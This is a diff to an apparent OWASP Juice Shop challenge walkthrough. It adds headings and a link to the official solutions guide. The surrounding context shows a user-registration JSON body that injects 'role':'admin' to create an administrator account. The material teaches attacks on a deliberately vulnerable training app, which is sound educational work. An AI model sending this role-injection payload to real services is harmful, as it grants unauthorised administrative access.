@@ -155,3 +155,6 @@ Register as a new user and then inspect the Network traffic for `/api/Users/`. R
 {"email":"gen-admin2@juice-sh.op",
 "role":"admin","password":"admin123","passwordRepeat":"admin123","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-02-27T06:51:33.047Z","updatedAt":"2025-02-27T06:51:33.047Z"},"securityAnswer":"admin"}
 ```
+### 2. Deluxe Fraud
+The official guide's solution is [here](https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html#_obtain_a_deluxe_membership_without_paying_for_it).
+### 3. Mint the Honey Pot
